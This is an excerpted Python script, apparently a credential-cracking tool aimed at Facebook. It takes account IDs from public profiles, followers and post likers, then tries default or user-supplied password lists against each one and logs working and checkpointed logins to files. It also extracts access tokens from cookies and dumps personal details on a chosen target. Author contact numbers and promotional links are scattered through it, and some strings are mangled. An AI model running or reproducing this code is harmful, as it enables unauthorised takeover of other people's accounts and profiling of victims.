...
\x1b[1;95m  __  __ ____    ____    _       _     _   _    ____  
\x1b[1;93m|  \/  |  _ \  / ___|  / \     | |   | | / \  |  _ \ 
\x1b[1;35m| |\/| | |_) | \___ \ / _ \ _  | |_  | |/ _ \ | | | |
\x1b[1;92m| |  | |  _ < _ ___) / ___ | |_| | |_| / ___ \| |_| |
\x1b[1;34m|_|  |_|_| \_( |____/_/   \_\___/ \___/_/   \_|____/ 
  \033[1;92m
  \033[1;91;1m \033[1;37m [•] \033[1;31;1mTOOLS OWNER     \033[1;37m [•]  \033[1;32m         \033[1;37m [•] \033[1;31;1m ()'() \033[1;37m  [•]  \033[1;31m 
  \033[1;31;1m \033[1;37m [•] \033[1;32;1mFACEBOOK PAGE   \033[1;37m [•]\033[1;32m         \033[1;37m [•] \033[1;32m  SAJJAD HELP ZONE   \033[1;37m[•]  \033[1;31m            
  \033[1;31;1m \033[1;37m [•] \033[1;33;1mGITHUB USER     \033[1;37m [•]\033[1;32m             \033[1;37m [•] \033[1;33m  SHAHZADA-AHMED     \033[1;37m[•]    \033[1;31m         
  \033[1;31;1m \033[1;37m [•] \033[1;34;1mWHATS APP NUMBER\033[1;37m [•]  \033[1;32m \033[1;37m [•] \033[1;34m+8801840-215106 \033[1;37m[•]      \033[1;31m                
...
def menu_log():
    ...
    if pmu in ['']:
        ...
        try:
            ...
            print('%s║'%(H))
            jalan('%s╚══[%s!%s] %sToken InvSAJJADd'%(M,H,M,H))
            os.system('rm -rf token.txt')
            menu_log()
        ...
        try:
            ...
            hasil = "\n* Fail : maybe your cookie invSAJJADd !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
            xd = open("token.txt", "w")
            ...
            print('%s║'%(H))
            jalan('%s╚══[%s!%s] %sCookies InvSAJJADd'%(M,H,M,H))
            os.system('rm -rf token.txt')
            menu_log()
        ...
        jalan('%s╠══[%s!%s] %sThank You For Using My Tool'%(H,O,H,K))
        jalan('%s╚══[%s!%s] %sAllah Hafiz :)\n'%(H,O,H,K))
        os.system('rm -rf token.txt')
        clear()
        exit()
    else:
...
def menu():
    ...
    try:
        ...
        users = 'Pricode Paid bro'
        maile = 'shahzadaahmed73744@gmail.com'
    ...
    try:
        ...
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies InvSAJJADd'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        print('%s╔══[ %sOh %s]%s'%(M,P,M,P))
    ...
    try:
        ...
        ip = " "
    print('%s╔══[ %sWelcome To My Tool:) %s %s]'%(H,K,n,H))
    print('%s║'%(H))
    ...
    print('%s╠══[%s•%s] %sVSAJJADd until : %s'%(H,K,H,K,kadaluarsa))
    print('%s╠%s[!%s] %sNotice: Crack It Depends on Hockey Yes Slurd If Error Jan Blame Sc He Says Directly To Me If An Error%s[!%s]'%(H,M,M,B,M,M))
    print('%s║'%(H))
    print('%s╠══[%s1%s] %sCrack From Public ID %s'%(H,U,H,U,jid))
    print('%s╠══[%s2%s] %sCrack From Public Followers %s'%(H,U,H,U,jid))
    print('%s╠══[%s3%s] %sCrack FRom Post Like %s'%(H,U,H,U,jid))
    print('%s╠══[%s4%s] %sRetrieve Target Data'%(H,U,H,U))
    print('%s╠══[%s5%s] %sDump ID %s'%(H,U,H,U,pro))
    print('%s╠══[%s6%s] %sCheck Crack List %sCP%s/%sOK'%(H,U,H,U,K,P,H))
    print('%s╠══[%s7%s] %sCheck Checkpoint Crack Option%s'%(H,U,H,U,pro))
    print('%s╠══[%s8%s] %sUser Agent %sU%s/%sA'%(H,U,H,U,H,P,O))
    print('%s╠══[%s9%s] %s%s %s[ Can not %s]'%(H,U,H,U,upgrade,M,M))
    print('%s╠══[%s10%s] %sInfo From Aurhor/Recode:v '%(H,U,H,U))
    print('%s╠══[%s11%s] %sSubscribe My Channel '%(H,U,H,U))
    print('%s╠══[%s12%s] %sAdd My Account'%(H,U,H,U))
    print('%s╠══[%s13%s] %sJoin Our Whatsapp Group '%(H,U,H,U))
    print('%s╠══[%s14%s] %sAdd WhatsApp Contacts%s[ The is an error ]'%(H,U,H,U,M))
    print('%s╠══[%s15%s] %sCollecting %sU%s/%sA '%(H,U,H,U,H,P,B))
    #print('%s╠══[%s16%s] %sCrack Versi 2 %s[ Eror ]'%(H,U,H,U,M))
    print('%s╠══[%s0%s] %sLog Out /Go out/ '%(H,U,H,U))
    pm = input('%s╠══[%s•%s] %sChoose /Select any option?/: '%(H,M,O,K))
    print('%s║'%(H))
    if pm in ['']:
        jalan('%s╚══[%s!%s] %sCorrect'%(M,H,M,H))
        menu()
        ...
        jalan('%s╚══[%s!%s] %sSee you later'%(H,O,H,K))
        os.system('rm -rf token.txt')
        menu_log()
    else:
        jalan('%s╚══[%s!%s] %sCorrect'%(M,H,M,H))
...
def ua():
	...
	mlaku(" %s[=] %sWant More? Chat Wa Gw >> %s03047269778%s <<"%(H,B,U,P))
	input('%s╚══[ %sReturn%s]%s'%(H,O,H,K))
	menu()
def buy_license():
	print("%sThis menu cannot be used"%(M))
	input('%s╚══[ %sReturn%s]%s'%(H,O,H,K))
	menu()
#Tambahin Kontak Gw Bang
def kontakwa():
	print(" %s[!] Jani Sent A Text"%(B))
	os.system('xdg-open https://youtube.com/channel/UCO97zzdSWPQ62TS861GLCgw')
	input('%s╚══[ %sReturn%s]%s'%(H,O,H,K))
	menu()
#Join Grup Whatsapp bang
def joinwa():
	print("%s[!] If You Want To Join  Sent A message"%(H))
	os.system('xdg-open https://chat.whatsapp.com/Jz6yhLcbjS34MD32fj4y5P')
	input('%s╚══[ %sReturn%s]%s'%(H,O,H,K))
	menu()
#Add Akun Gw
def add():
	print("%s╚══%s[%s!%s] %sAdd Me On Fb"%(H,B,U,H,K))
	os.system('xdg-open https://www.facebook.com/profile.php?id=100065434664869/')
	input('%s╚══[ %sReturn%s]%s'%(H,O,H,K))
	menu()
#Join Grup Termox
def join():
	print("%s╠══%sSubscribe My Channel"%(B,H))
	os.system('xdg-open https://youtube.com/channel/UCO97zzdSWPQ62TS861GLCgw/')
	input('%s╚══[ %sReturn%s]%s'%(H,O,H,K))
	menu()
#Ingfo
def ingfog():
	mlaku("%s╠═════════════════════════════════════════════════════════════════╗"%(K))
	mlaku("%s╠══%s[%s1%s] %sMethod For Cracking"%(B,H,K,H,U))
	mlaku("%s╠%s[%s!%s] %sMethod B-Api (Fast)"%(B,H,K,H,U))
	mlaku("%s╠%s[%s!%s] %sMethod Mbasic  (Normal)"%(B,H,K,H,U))
	mlaku("%s╠%s[%s!%s] %sMethod Free FB (slow)"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s2%s] %sKeep Enjoying"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s3%s] %sAuthor Real/Recode"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sAuthor%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠%s[%s+%s] %sSAJJAD><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sSAJJAD><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sRecode%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠ %s[%s+%s] %sSAJJAD Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sSAJJAD Cans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %shussaini Gans><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sbablu Gw%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠%s[%s+%s] %sch sultan Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %susama Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sshahzad Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %scahndu Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Cans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	...
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %setc%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠%s[%s+%s] %sif u have any problem text me on wp>> 03047269778><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sThanks Bro%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠══%s[%s-%s] %sAuthor%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠%s[%s+%s] %sSAJJAD><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sSAJJAD><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sRecode%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠ %s[%s+%s] %sHUSSAINI Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sBABLU Cans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %setc Gw%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %setc Gans><"%(B,H,K,H,U))
...
def ugen():
    var_ugen()
    pmu = input('%s╠══[%s•%s] %sChoose /Input/: '%(H,O,H,K))
    print('%s║'%(O))
    if pmu in[""]:
        jalan('%s╚══[%s!%s] %sCorrect'%(M,H,M,H))
        menu()
        ...
        try:
            ...
            ugent.write(ua)
            ugent.close()
            jalan("\n%s╔══[ %sSuccess Change User Agent %s]"%(H,O,H))
            print('%s║'%(O))
            input('%s╚══[ %sReturn %s]%s'%(H,O,H,K))
            menu()
        except (KeyError,IOError):
            jalan("\n%s╔══[ %sChange User Agent %s]"%(M,H,M))
            print('%s║'%(M))
            input('%s╚══[ %sReturn%s]%s'%(M,H,M,H))
            menu()
    elif pmu in ['3','03','003','c']:
        ugen_hp()
    elif pmu in ['4','04','004','d']:
        os.system("rm -rf ugent.txt")
        jalan("%s╠══[ %sUser Agent Delete %s]"%(H,O,H))
        print('%s║'%(O))
        input('%s╚══[ %sReturn %s]%s'%(H,O,H,K))
        menu()
...
def ugen_hp():
    ...
    pc = input('%s╠══[%s•%s] %sChoose /input/: '%(H,O,H,K))
    print('%s║'%(O))
    if pc in['']:jalan('%s╚══[%s!%s] %sCorrect'%(M,H,M,H));menu()
    elif pc in ['1','01']:
    ...
    else:jalan('%s╚══[%s!%s] %sCorrect'%(M,H,M,H));menu()
    jalan("%s╠══[ %s User Agent %s]"%(H,O,H))
    print('%s║'%(O))
    input('%s╚══[ %sReturn %s]%s'%(H,O,H,K))
    menu()
def publik():
    ...
    try:
        ...
        jalan('%s╚══[%s!%s] %sToken/Cookies InvSAJJADd'%(M,H,M,H))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,H,M,H))
...
def likers():
    ...
    try:
        ...
        jalan('%s╚══[%s!%s] %sToken/Cookies Wrong/Expired'%(M,H,M,H))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,H,M,H))
...
def tambah_pass():
    print('%s║'%(H))
    print('%s╠══[%s•%s] %sFor Example :  pakistan,123456,786786'%(H,O,H,K))
    cuy = input('%s╠══[%s•%s] %sEnter Manual Additional Pass [1 Write] : '%(H,O,H,K))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
...
def log_api(em,pas,hosts):
    ...
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        ...
        "x-fb-connection-quSAJJADty": "EXCELLENT",
...
class crack:
    def __init__(self,files):
        ...
        self.ko = 0
        print('%s║'%(O))
        print('%s╠══[%s•%s] %sCrack For Password Default/Manual [d/m]'%(H,O,H,K))
        while True:
            f = input('%s╠══[%s•%s] %sChoose : '%(H,O,H,K))
            if f=="":
                jalan('%s╚══[%s!%s] %sCorrect'%(M,H,M,H))
                menu()
                ...
                try:
                    ...
                    print(("   %s"%e))
                    continue
                print('%s╠══[%s•%s] %sFor example : Pakistan,786786,123456'%(H,O,H,K))
                self.pwlist()
                break
                ...
                try:
                    ...
                    self.fl = []
                    start_methodezz()
                    kopi = input('%s╠══[%s•%s] %sChoose : '%(H,O,H,K))
                    if kopi in ['']:
                        jalan('%s╚══[%s!%s] %sCorrect'%(M,H,M,H))
                        menu()
                    elif kopi in ['1','01']:
                        ...
                        menu()
                    start_method()
                    put = input('%s╠══[%s•%s] %sChoose : '%(H,O,H,K))
                    print('%s║'%(O))
                    if put in ['']:
                        jalan('%s╚══[%s!%s] %sCorrect'%(M,H,M,H))
                        menu()
                    elif put in ['1','01','001','a']:
                        print('%s╠══[%s•%s] %sUse Options Checkpoint? [y/t]'%(H,O,H,K))
                        puf = input('%s╠══[%s•%s] %sChoose : '%(H,O,H,K))
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %sIsi Correct'%(M,H,M,H))
                            menu()
                        ...
                        print('%s╠══[%s•%s] %suse Option Checkpoint? [y/t]'%(H,O,H,K))
                        puf = input('%s╠══[%s•%s] %sChoose : '%(H,O,H,K))
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %sIsi Correct'%(M,H,M,H))
                            menu()
                        ...
                        if puf in ['']:
                            ...
                            jalan('%s╚══[%s!%s] %sIsi Coreecr'%(M,H,M,H))
                            menu()
                    else:
                        jalan('%s╚══[%s!%s] %sIsi Correct'%(M,H,M,H))
                        menu()
    ...
    def pwlist(self):
        ...
        if len(self.pw) ==0:
            ...
            print('%s║'%(H))
            if put in ['']:
                jalan('%s╚══[%s!%s] %sIsi Correcr'%(M,H,M,H))
                menu()
            elif put in ['1','01','001','a']:
                print('%s╠══[%s•%s] %sUse Option Checkpoint? [y/t]'%(H,O,H,K))
                puf = input('%s╠══[%s•%s] %sChoose : '%(H,O,H,K))
    ...
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sSAJJAD/Cp%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                    ...
                    print("\r%s[%SAJJAD/Cp%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%SAJJAD/Ok%s] %s • %s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id"))))
            ...
            self.ko+=1
            print("\r%s[%sSAJJAD x SAJJAD x Bablu%s][%s%s/%s%s][%sLolos:%s%s][%sSesi:%s%s]%s"%(H,O,H,K,self.ko,len(self.fl),H,O,len(self.ada),H,O,len(self.cp),H,O), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%sSAJJAD/Cp%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sSAJJAD/Ok%s] %s • %s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id"))))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sSAJJAD/Ok%s] %s • %s%s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id")),U)
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sSAJJAD/Cp%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                    ...
                    h_cp = "\r%s[%sRK%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_cp = "\r%s[%sSAJJAD/Cp%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
...
def target():
    ...
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies InvSAJJADd'%(M,H,M,H));menu_log()
    idt = input("%s╠══[%s•%s] %sID Target : "%(H,O,H,K))
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sID Not Found'%(M,H,M,H));menu()
    try:nm = zy["name"]
    ...
    jalan('%s╠══[%s•%s] %sName : %s'%(H,O,H,K,nm))
    jalan('%s╠══[%s•%s] %sFirst Name : %s'%(H,O,H,K,nd))
    jalan('%s╠══[%s•%s] %sMiddle Name : %s'%(H,O,H,K,nt))
    jalan('%s╠══[%s•%s] %sLast Name : %s'%(H,O,H,K,nb))
    ...
    jalan('%s╠══[%s•%s] %sReligion : %s'%(H,O,H,K,rg))
    jalan('%s╠══[%s•%s] %sRelation Status : %s'%(H,O,H,K,rl))
    jalan('%s╠══[%s•%s] %sRelationship With : %s'%(H,O,H,K,rls))
    jalan('%s╠══[%s•%s] %sLocation : %s'%(H,O,H,K,lc))
    jalan('%s╠══[%s•%s] %sPlace of Origin : %s'%(H,O,H,K,ht))
    jalan('%s╠══[%s•%s] %sAbout : %s'%(H,O,H,K,ab))
    jalan('%s╠══[%s•%s] %sLocate : %s'%(H,O,H,K,lo))
    print('%s║'%(O))
    input('%s╚══[ %sReturn %s]%s'%(H,O,H,K))
    menu()
def teman_target():
    ...
    try:
        ...
        jalan('%s╚══[%s!%s] %sToken/Cookies InvSAJJADd/Expired'%(M,H,M,H))
        menu_log()
    tt=[]
    te=[]
    ...
    for id in tt:
        try:
            ...
            print('%s╠══%s[%s!%s] %sSpam Account'%(O,H,M,H,O))
    print('%s║'%(O))
...
def hasil():
    clear()
    banner()
    jalan('%s╔══[ %sTotal Crack %s]'%(H,O,H))
    print('%s║'%(H))
    print('%s╠══[%s1%s] %sCheck Total OK'%(H,O,H,K))
    print('%s╠══[%s2%s] %sCheck Total CP'%(H,O,H,K))
    ch = input('%s╠══[%s•%s] %sChoose : '%(H,O,H,K))
    if ch in ['']:
        jalan('%s╚══[%s!%s] %sIsi Correct'%(M,H,M,H))
        menu()
...
def log_hasil(user, pasw):
    ...
    try:
        ...
        print("%s[%s!%s] %sSpam Account"%(M,H,M,H))
    if "c_user" in ses.cookies:
        print("%s[%s•%s] %sAccount Passed Not Session"%(H,U,H,U))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        ...
        if(str(len(ngew))=="0"):
            ...
            print("%s[%s•%s] %sSession %s Option "%(H,O,H,K,str(len(ngew))))
        for opt in range(len(ngew)):
        ...
        print("%s[%s!%s] %sPassword Replaced"%(M,H,M,H))
def cek_hasil():
    ...
    try:
        ...
        print("%s╚══[%s!%s] %sFile Replaced"%(M,H,M,H))
    ...
    for memek in buka_baju:
        ...
        print("")
    print("")
    print('%s╔══[%s•%s] %s Checking Success'%(H,O,H,K))
    print('%s║'%(H))
    input('%s╚══[ %sReturn %s]%s'%(H,O,H,K))
    menu()
def var_menu():
...
def var_author():
    ...
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sSAJJAD :'%(H,O,H,K))
    mlaku('%s║     • %sSAJJAD'%(H,O))
    mlaku('%s║     • %sHussaini'%(H,O))
    mlaku('%s╠══[%s•%s] %sAuthor :'%(H,O,H,K))
    mlaku('%s║     • %sSAJJAD'%(H,O))
    mlaku('%s║     • %sSAJJAD'%(O,P))
    mlaku('%s║'%(H))
    mlaku('%s╠══[%s•%s] %sTeam Project %sTeamCode%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %sTechnical Tzy'%(H,O))
    mlaku('%s║     • %sSAJJAD Tzy'%(H,O))
    mlaku('%s║     • %sSAJJAD Tzy'%(H,O))
    mlaku('%s║     • %sSAJJAD XD '%(H,O))
    mlaku('%s║     • %shussaini XD'%(H,O))
    mlaku('%s║     • %sBablu'%(H,O))
    mlaku('%s║     • %setc'%(H,O))
    mlaku('%s║     • %setc'%(H,O))
    mlaku('%s║     • %setc'%(H,O))
